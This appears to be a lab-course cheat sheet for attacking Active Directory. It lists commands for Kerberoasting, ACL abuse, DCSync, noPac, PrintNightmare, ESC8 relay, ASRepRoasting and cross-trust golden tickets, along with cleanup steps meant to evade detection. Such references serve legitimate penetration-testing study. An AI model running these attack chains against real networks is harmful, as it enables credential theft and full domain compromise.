* **What it does:** These commands use the native Windows `ActiveDirectory` PowerShell module and the PowerView script for enumeration.
    * `Import-Module ActiveDirectory`: Loads the official AD module.
    * `Get-ADDomain`: Gets information about the current domain.
    * `Get-ADUser -Filter {ServicePrincipalName -ne "$null"}...`: Finds all users that have a Service Principal Name (SPN) configured. These are potential targets for Kerberoasting.
    * `Get-ADTrust -Filter *`: Enumerates all domain trusts.
    * `Get-ADGroupMember -Identity "Domain Admins"`: Lists members of the specified group.
    * `Get-DomainUser` / `Get-DomainGroupMember` / `Test-AdminAccess`: These are PowerView commands that provide more user-friendly and powerful enumeration capabilities than the built-in cmdlets.
* **When to use them:** When you have a shell on a domain-joined Windows host, these are the primary tools for enumerating the domain from the inside.

---

### `Snaffler.exe`

* **What it does:** Snaffler is a tool for finding sensitive data on file shares in Active Directory. It enumerates computers, then scans their shares for files with interesting content or names (passwords, configs, etc.).
* **When to use it:** After gaining initial access, run Snaffler to automatically hunt for loot across the network. It's great for quickly finding credentials in configuration files, scripts, or user documents.
* **Options:**
    * `-s`: Find file shares and search them.
    * `-d <domain>`: The domain to target.
    * `-o <logfile>`: The file to log results to.
    * `-v`: Verbose output.

---

### `SharpHound.exe`

* **What it does:** The C# equivalent of `bloodhound-python`. It is the official data collector (ingestor) for BloodHound, designed to be run from a Windows machine.
* **When to use it:** When you have a shell on a Windows machine and want to collect BloodHound data. It is generally faster and more reliable than the Python version when run from within the target environment.
* **Options:**
    * `-c All`: Specifies the collection method to gather all information.
    * `--zipfilename <name>`: Compresses the output JSON files into a single zip file for easy exfiltration.

---
---

## Kerberoasting

This attack exploits a feature of Kerberos where service accounts have a Service Principal Name (SPN) and a password hashed into a service ticket. Any domain user can request these tickets from the Domain Controller. The encrypted portion of the ticket can be taken offline and cracked to reveal the service account's plaintext password.

### `GetUserSPNs.py`

* **What it does:** An Impacket script that queries the Domain Controller for accounts with SPNs and requests their Kerberos TGS (Ticket Granting Service) tickets.
    * `GetUserSPNs.py ... INLANEFREIGHT.LOCAL/forend`: Without `-request`, this simply *lists* the accounts with SPNs.
    * `-request`: This flag tells the script to actually *request* the TGS tickets for those accounts.
    * `-request-user <user>`: Requests a ticket for a single, specific user.
    * `-outputfile <file>`: Saves the hash from the ticket into a file in a format suitable for cracking.
* **When to use it:** From a Linux attack machine, once you have any valid set of domain credentials. It's the primary tool for performing the Kerberoasting attack.
* **Options:**
    * `-dc-ip <ip>`: IP address of the Domain Controller.
    * `INLANEFREIGHT.LOCAL/forend`: The username and domain of the account you are using to perform the query.

---

### `hashcat -m 13100 ...`

* **What it does:** Cracks the TGS ticket hash obtained from the Kerberoasting attack.
* **When to use it:** After using `GetUserSPNs.py` or another tool to extract the hash.
* **Options:**
    * `-m 13100`: The hash mode for Kerberos 5 TGS-REP (etype 23). This is the standard mode for Kerberoasting hashes.
    * `sqldev_tgs`: The file containing the hash.
    * `/usr/share/wordlists/rockyou.txt`: The wordlist to use.
    * `--force`: May be needed if you are running Hashcat in a VM or with suboptimal drivers.

---

### `setspn.exe -Q */*` (Windows)

* **What it does:** A built-in Windows tool to manage Service Principal Names.
* **When to use it:** To query the domain for all registered SPNs. This command is the native Windows equivalent of running `GetUserSPNs.py` without the `-request` flag. It's used to identify potential Kerberoasting targets.
* **Options:**
    * `-Q */*`: Queries for all SPNs (`*/*`) in the domain.
    * `-T <domain>`: Can be used to target a specific domain.

---

### `New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken ...` (Windows)

* **What it does:** This is a .NET method that, when called with an SPN as an argument, will request the corresponding Kerberos ticket.
* **When to use it:** This is a "living off the land" way to request the service tickets for Kerberoasting directly from PowerShell, without needing external tools like Rubeus or Mimikatz. You would then need to extract the hash from memory.
* **Options:**
    * The string argument (`"MSSQLSvc/..."`) is the SPN of the target service account.

---

### Mimikatz (Kerberoasting)

* **What it does:**
    * `kerberos::list /export`: Lists all Kerberos tickets currently in memory for the user's session and saves them to `.kirbi` files.
* **When to use it:** After running the PowerShell .NET commands to request tickets, you can use Mimikatz to dump them from memory to disk.
* **Options:**
    * `/export`: Dumps the tickets to files.

---

### `kirbi2john.py`

* **What it does:** A script that converts the `.kirbi` file format (from Mimikatz or Rubeus) into a hash format that John the Ripper (and sometimes Hashcat) can understand.
* **When to use it:** As a necessary conversion step after exporting Kerberos tickets from Mimikatz before you can crack them.
* **Options:** The command takes the `.kirbi` file as an argument.

---

### PowerView (Kerberoasting)

* **What it does:**
    * `Get-DomainUser * -spn`: Finds all users with an SPN (same as `setspn -Q */*`).
    * `Get-DomainSPNTicket -Format Hashcat`: Requests TGS tickets for all users with SPNs and formats the hashes directly for use with Hashcat.
* **When to use it:** This is a very efficient, all-in-one method to perform Kerberoasting from PowerShell. It finds the targets, requests the tickets, and extracts the hashes in one pipeline.
* **Options:**
    * `-Format Hashcat`: Specifies the output format for easy cracking.

---

### Rubeus

* **What it does:** Rubeus is the definitive C# tool for all things Kerberos.
    * `kerberoast /stats`: Scans for all kerberoastable users and displays statistics.
    * `kerberoast /nowrap`: Performs the Kerberoasting attack and outputs the hashes to the console without word wrapping for easy copying.
    * `kerberoast /ldapfilter:'admincount=1'`: An advanced option that uses an LDAP filter to only roast users who have `admincount=1` set (i.e., privileged accounts).
    * `kerberoast /tgtdeleg`: Performs a special kind of Kerberoasting for accounts with unconstrained delegation.
* **When to use it:** Rubeus is the recommended tool for Kerberoasting when on a Windows host. It is extremely powerful, fast, and has many options for customization.
* **Options:** Rubeus has a vast number of options. `/user:`, `/ou:`, `/format:`, and `/outfile:` are other common ones.

---

Let's resume. Here is the breakdown of the remaining sections.

---
---

## Access Control (ACL) Abuse

Active Directory is secured by Access Control Lists (ACLs), which define what permissions (e.g., read, write, reset password) a user or group has over an object (like another user, a group, or a computer). Misconfigured ACLs are a common path to privilege escalation.

### `Find-InterestingDomainAcl`

* **What it does:** A PowerView function that scans for common, abusable ACL misconfigurations in the domain. It looks for things like a low-privileged user having rights to change a high-privileged group's membership or reset an admin's password.
* **When to use it:** Early in the credentialed enumeration phase. Running this can quickly highlight direct paths to privilege escalation that you might otherwise miss.
* **Options:** This function can be customized with various parameters to narrow the search, but it's often run without any to get a broad overview.

### `Get-DomainObjectACL` & `Convert-NameToSid`

* **What it does:**
    * `Convert-NameToSid`: A PowerView function that converts a username or group name to its Security Identifier (SID).
    * `Get-DomainObjectACL`: A PowerView function that retrieves the ACLs for a specific AD object. The example command uses the SID of user `wley` to find all objects where `wley` has some explicit permission.
* **When to use it:** When you've identified an interesting user or group and want to perform a detailed investigation into exactly what permissions they have across the entire domain.
* **Options:**
    * `-Identity *`: Scans all domain objects.
    * `? {$_.SecurityIdentifier -eq $sid}`: This is a PowerShell `Where-Object` clause to filter the results and show only the permissions assigned to the specific SID you're investigating.
    * `-ResolveGUIDs`: Translates cryptic GUIDs in the ACLs into human-readable names like "User-Force-Change-Password".

---

### ACL Abuse Attack Chain Example

The following sequence of commands demonstrates a full attack path abusing misconfigured ACLs.

1.  **`Set-DomainUserPassword -Identity damundsen ... -Credential $Cred`**
    * **What it does:** Abuses a "ForceChangePassword" permission. The attacker, using the credentials of user `wley` (stored in `$Cred`), resets the password for the user `damundsen`.
    * **When to use it:** When you discover a user has the right to change another user's password.

2.  **`Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2`**
    * **What it does:** Abuses a "WriteMembers" permission. The attacker, now controlling the `damundsen` account (credentials in `$Cred2`), adds themself to the 'Help Desk Level 1' group.
    * **When to use it:** When you've compromised a user who has the right to modify the membership of a group. This is a classic privilege escalation technique.

3.  **`Set-DomainObject ... -SET @{serviceprincipalname='notahacker/LEGIT'}`**
    * **What it does:** Abuses a "GenericWrite" or "WriteProperty" permission on a user object. The attacker, using `damundsen`'s credentials, sets a Service Principal Name (SPN) on another user, `adunn`.
    * **When to use it:** When you have write access to a user object. By adding an SPN, you make that user account **kerberoastable**. This is a powerful technique to attack an account that you can't directly modify (e.g., reset its password).

4.  **`.\Rubeus.exe kerberoast /user:adunn /nowrap`**
    * **What it does:** Performs a targeted Kerberoast attack against the user `adunn`, who now has an SPN.
    * **When to use it:** Immediately after adding an SPN to a target user to get their password hash for offline cracking.

5.  **Cleanup Commands (`Set-DomainObject -Clear ...`, `Remove-DomainGroupMember`)**
    * **What it does:** These commands reverse the changes made during the attack (clearing the SPN, removing the user from the group) to cover tracks and restore the original state.
    * **When to use it:** After successfully completing an attack and escalating privileges, it's good practice to clean up your modifications to avoid detection.

---
---

## DCSync

DCSync is an attack that leverages a specific set of Active Directory permissions (DS-Replication-Get-Changes and DS-Replication-Get-Changes-All). An attacker with these rights can impersonate a Domain Controller and ask another DC to replicate password data, including the NTLM hash of the `krbtgt` account, which is the key to the entire domain.

### `Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} ...`

* **What it does:** This PowerView command queries the ACLs on the domain object itself to find which users or groups have the "Replication-Get" permissions required for a DCSync attack.
* **When to use it:** During the credentialed enumeration phase to identify users who are either intentionally or unintentionally granted these high-level privileges. Compromising one of these users is often a "win" condition.
* **Options:** The `Where-Object` clauses (`? { ... }`) are used to filter the massive list of ACLs down to only the specific DCSync permissions and the user you are investigating.

---

### `secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5`

* **What it does:** An Impacket script that performs the DCSync attack. It uses the credentials of a user with DCSync rights (`adunn`) to connect to the Domain Controller and dump all the password hashes from the domain database (NTDS.dit).
* **When to use it:** Once you have compromised a user with DCSync privileges. This is the primary tool for executing the attack from a Linux machine.
* **Options:**
    * `-outputfile <name>`: Saves the dumped hashes to a file.
    * `-just-dc`: A flag that tells `secretsdump` to perform the DCSync attack instead of other methods.
    * `INLANEFREIGHT/adunn@172.16.5.5`: The format is `DOMAIN/user@DC_IP`. A password or hash can also be provided.

---

### `.\mimikatz.exe "privilege::debug" "lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator"`

* **What it does:** Uses Mimikatz to perform the DCSync attack from a Windows host. This command specifically requests the hash for the domain administrator account.
* **When to use it:** When you have a shell on a Windows machine as a user with DCSync rights. It's the go-to tool for this attack on Windows.
* **Options:**
    * `privilege::debug`: Attempts to elevate Mimikatz's privileges, which is often required.
    * `lsadump::dcsync`: The Mimikatz module for this attack.
    * `/domain:<domain>`: The target domain.
    * `/user:<user>`: The specific user to get the password hash for. If omitted, it will try to dump all hashes.

---
---

## Privileged Access

This section covers methods for accessing systems where a compromised user has administrative rights and techniques for exploiting privileged access to services like MSSQL.

### `Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Desktop Users"`

* **What it does:** A PowerView function that remotely queries a computer to see who is a member of a specific local group (in this case, "Remote Desktop Users").
* **When to use it:** After compromising a user, you can use this to check if that user is a member of the RDP or WinRM user groups on interesting servers, which would grant you remote access.
* **Options:**
    * `-ComputerName <name>`: The remote computer to query.
    * `-GroupName <name>`: The local group to inspect.

---

### `Enter-PSSession -ComputerName ACADEMY-EA-MS01 -Credential $cred`

* **What it does:** Starts an interactive PowerShell Remoting (WinRM) session on a remote computer.
* **When to use it:** When you have credentials for a user who is a member of the "Remote Management Users" or local "Administrators" group on the target machine. This gives you a powerful, fully interactive PowerShell shell on the remote system.
* **Options:**
    * `-ComputerName <name>`: The target machine.
    * `-Credential <PSCredential>`: A credential object containing the username and password.

---

### `evil-winrm -i 10.129.201.234 -u forend`

* **What it does:** A Ruby-based tool that provides a WinRM shell from a Linux attack machine. It's essentially the Linux equivalent of `Enter-PSSession`.
* **When to use it:** This is the standard tool for connecting to a Windows host via WinRM from a non-Windows machine. It's extremely reliable and provides a good shell experience.
* **Options:**
    * `-i <ip>`: The target IP address.
    * `-u <user>`: The username. You will be prompted for a password. You can also provide it with `-p <pass>`.

---

### PowerUpSQL & `mssqlclient.py`

* **What it does:** These are tools for attacking Microsoft SQL Server.
    * `Get-SQLInstanceDomain`: A PowerUpSQL (PowerShell) function that searches Active Directory for SQL server instances.
    * `Get-SQLQuery`: A PowerUpSQL function to execute an arbitrary SQL query on a server.
    * `mssqlclient.py`: An Impacket script that provides an interactive SQL shell from a Linux machine.
    * `enable_xp_cmdshell`: A command within the `mssqlclient.py` shell. If the logged-in user is a sysadmin (`sa`), this re-enables the `xp_cmdshell` stored procedure, which allows you to execute operating system commands.
* **When to use them:** When Nmap reveals an open MSSQL port (1433/tcp). First, you discover instances with PowerUpSQL. Then, if you have credentials (or find a weak `sa` password), you connect with `mssqlclient.py`. If you can enable `xp_cmdshell`, you can get command execution on the underlying server, often as a highly privileged service account.

---

### BloodHound Queries for Privileged Access

* **What it does:** These are Cypher queries to be run inside the BloodHound GUI.
    * `MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:CanPSRemote*1..]->(c:Computer) RETURN p2`: This query finds the shortest path for a user to gain PS Remote (WinRM) access to a computer, including paths via group membership.
    * `MATCH p1=shortestPath... MATCH p2=(u1)-[:SQLAdmin*1..]->(c:Computer) RETURN p2`: This query finds paths where a user can gain SQL admin rights on a computer.
* **When to use them:** After collecting data with SharpHound/bloodhound-python and loading it into the GUI, you run these queries to automatically find complex attack paths that involve nested group memberships leading to administrative rights on a machine.

---
---

## Bleeding Edge

This section covers attacks based on more recent vulnerabilities and advanced techniques.

### `noPac` (SAM the Admin) Exploit

* **What it does:**
    * `scanner.py`: A script to scan for Domain Controllers vulnerable to CVE-2021-42287.
    * `noPac.py`: A script that exploits two vulnerabilities (CVE-2021-42287 and CVE-2021-42278) to escalate privileges from a standard domain user to a Domain Admin. It works by creating a machine account (which a user can do by default), renaming it to look like a Domain Controller, and then requesting a Kerberos ticket.
* **When to use it:** When the domain controllers are not patched against these specific vulnerabilities. It's a very direct path from low privilege to domain compromise.
* **Options:**
    * `--impersonate administrator`: Tells the script to escalate to the `administrator` account.
    * `-shell`: Provides an interactive shell as the impersonated user.
    * `-dump`: Can be used to perform a DCSync and dump credentials.

---

### PrintNightmare (`CVE-2021-1675`)

* **What it does:**
    * `rpcdump.py`: Used to check if the Print Spooler service (`MS-RPRN`) is running and accessible on a target.
    * `msfvenom`: Used to create a malicious DLL payload.
    * `smbserver.py`: An Impacket script to host the malicious DLL on a fake SMB share.
    * `CVE-2021-1675.py`: The exploit script. It tells the vulnerable Print Spooler service on the Domain Controller to load and execute the malicious DLL from the attacker's SMB share.
* **When to use it:** When a Domain Controller is vulnerable to PrintNightmare. This exploit allows a standard authenticated user to execute code as `SYSTEM` on the DC, leading to a full domain compromise.
* **Prerequisites:** You need valid domain credentials and the DC's spooler service must be enabled and accessible.

---

### AD CS Relay (ESC8) Attack

* **What it does:** This is a complex attack chain involving several tools.
    1.  `ntlmrelayx.py --adcs ...`: Sets up a relay server. `ntlmrelayx` will wait for an incoming NTLM authentication, relay it to an Active Directory Certificate Services (AD CS) web endpoint, and use the victim's identity to request a client certificate.
    2.  `PetitPotam.py <attacker_ip> <dc_ip>`: Coerces the Domain Controller to authenticate to the attacker's machine via NTLM.
    3.  The DC authenticates to `ntlmrelayx`, which relays the authentication to AD CS and obtains a certificate on behalf of the DC.
    4.  `gettgtpkinit.py ...`: Uses the obtained certificate to request a Kerberos Ticket Granting Ticket (TGT) for the DC's machine account.
    5.  `secretsdump.py -k -no-pass ...`: With the TGT now cached, you can perform a DCSync attack to dump all domain hashes.
* **When to use it:** When the network has a misconfigured AD CS server that is vulnerable to NTLM relay attacks (e.g., HTTP endpoints enabled, no NTLM protection). This is a very powerful attack that can go from zero to Domain Admin.

---
---

*This is the final segment of the response. I'll cover the last few sections: "Miscellaneous Misconfigurations", "Trusts", and "Attacking Domain Trust".*

---
---

## Miscellaneous Misconfigurations

This section covers a variety of common security flaws and the tools to find and exploit them.

### `adidnsdump -u ...`

* **What it does:** A tool that connects to a domain's LDAP and dumps all of its DNS records. Active Directory often stores DNS zones within itself.
* **When to use it:** To get a comprehensive list of all hosts, services, and servers in the domain by enumerating its DNS records. This can reveal hidden servers or infrastructure that a normal network scan might miss.
* **Options:**
    * `-r`: Attempts to resolve the found hostnames to IP addresses.

---

### `Get-DomainUser * | ... | Where-Object {$_.Description -ne $null}`

* **What it does:** A PowerView command that finds all domain users and filters for those that have something written in their `Description` field.
* **When to use it:** To hunt for passwords or sensitive information that administrators sometimes carelessly leave in user or computer object descriptions.

---

### `Get-DomainUser -UACFilter PASSWD_NOTREQD`

* **What it does:** A PowerView command that uses a filter for the `userAccountControl` attribute to find all accounts that do not require a password.
* **When to use it:** To find misconfigured accounts. If you find one, you can often access it without needing a password at all.

---

### SYSVOL & Group Policy Preferences (GPP)

* **What it does:**
    * `ls \\academy-ea-dc01\SYSVOL\...`: The SYSVOL share on a DC is readable by all authenticated users and contains login scripts, group policy objects, etc. This command lists the contents of the scripts folder.
    * `gpp-decrypt <cpassword>`: A tool to decrypt the `cpassword` attribute found in old Group Policy Preferences XML files. Microsoft used to allow admins to set local user passwords via GPO, and the password was stored in an XML file in SYSVOL using a publicly known AES key.
    * `crackmapexec ... -M gpp_autologin`: A CME module that automatically searches for and decrypts these GPP passwords.
* **When to use it:** You should always check SYSVOL for sensitive files. The GPP password vulnerability is old, but if you find a domain that still has these files, it's often an instant win, providing local administrator passwords for many machines.

---

### ASRepRoasting

* **What it does:** An attack against user accounts that have the Kerberos pre-authentication setting disabled (`DONT_REQ_PREAUTH` is true).
    * `Get-DomainUser -PreauthNotRequired`: A PowerView command to find these vulnerable accounts.
    * `.\Rubeus.exe asreproast /user:mmorgan ...`: Rubeus requests an AS-REP ticket for the user. Since no pre-authentication is required, the DC provides a ticket encrypted with the user's password hash.
    * `GetNPUsers.py INLANEFREIGHT.LOCAL/ -usersfile ...`: The Impacket equivalent for performing ASRepRoasting from Linux.
    * `hashcat -m 18200 ...`: Cracks the captured AS-REP ticket hash to reveal the user's password.
* **When to use it:** During initial credentialed enumeration. It's a quick way to get password hashes for potentially privileged service accounts that might have this setting misconfigured.

---
---

## Trusts

Active Directory trusts are relationships between different domains (or forests) that allow users from one domain to access resources in another. Enumerating and understanding these trusts is critical in multi-domain environments.

### `Get-ADTrust -Filter *` & `Get-DomainTrust`

* **What it does:** PowerShell cmdlets (from the `ActiveDirectory` and `PowerView` modules, respectively) that enumerate all incoming and outgoing trusts for the current domain.
* **When to use it:** As soon a you identify that you are in a multi-domain environment. This helps you map out the entire forest and identify potential targets in other trusted domains.

---

### `netdom query /domain:inlanefreight.local trust`

* **What it does:** The built-in command-line equivalent for enumerating domain trusts.
* **When to use it:** When you need to enumerate trusts from a basic command prompt without access to PowerShell.
* **Options:**
    * `query`: The action to perform.
    * `trust`: The object type to query.

---
---

## Attacking Domain Trust

These attacks leverage trust relationships to move from a compromised domain into another, often more secure, domain.

### `mimikatz # lsadump::dcsync /user:LOGISTICS\krbtgt`

* **What it does:** If you are a Domain Admin in one domain (e.g., `INLANEFREIGHT`), and there is a two-way trust to another domain (`LOGISTICS`), you can use your privileges to DCSync the `krbtgt` hash from the trusted domain.
* **When to use it:** When you have compromised one domain in a forest and want to compromise another trusted domain.

---

### Golden Ticket for a Trusted Domain

* **What it does:** This is a multi-step attack:
    1.  Dump the `krbtgt` hash from the **target trusted domain** (`LOGISTICS`) using the command above.
    2.  Dump the SID of the **target domain** and the SID of the "Enterprise Admins" group in the **root domain** (`INLANEFREIGHT`).
    3.  `mimikatz.exe kerberos::golden ... /sids:<sid_of_EA_group>`: Use Mimikatz or `ticketer.py` to forge a Golden Ticket. This ticket is for a fake user in the `LOGISTICS` domain, but it includes the SID of the "Enterprise Admins" group from the root domain in its SID history (`/sids:`).
    4.  `ptt` / `export KRB5CCNAME`: Inject the ticket into memory or a file.
* **When to use it:** This is the ultimate trust attack. Because of how SID filtering is often configured, this ticket allows your fake user from the `LOGISTICS` domain to act as an Enterprise Admin in the `INLANEFREIGHT` domain, giving you full control of the entire forest.

---

### `lookupsid.py`

* **What it does:** An Impacket script that can query a domain for information, including Domain SIDs.
* **When to use it:** To gather the necessary SIDs from a Linux machine when preparing to forge a cross-domain golden ticket.

---

### `GetUserSPNs.py -target-domain FREIGHTLOGISTICS.LOCAL ...`

* **What it does:** Performs a Kerberoast attack against a trusted domain. A user in one domain can request TGS tickets for services in a trusted domain.
* **When to use it:** When you have low-privilege credentials in one domain and want to try and get a foothold in another by Kerberoasting service accounts there.
* **Options:**
    * `-target-domain <domain>`: Specifies that the SPN query should be for a different domain than the one your current user belongs to.

---

### `bloodhound-python -d ... -dc ...`

* **What it does:** In a multi-domain environment, you need to run the BloodHound ingestor against each domain controller separately to collect data for the entire forest.
* **When to use it:** To map out the entire forest in BloodHound. After running collection for all trusted domains, you can load all the JSON files into the BloodHound GUI at once to see cross-domain attack paths.
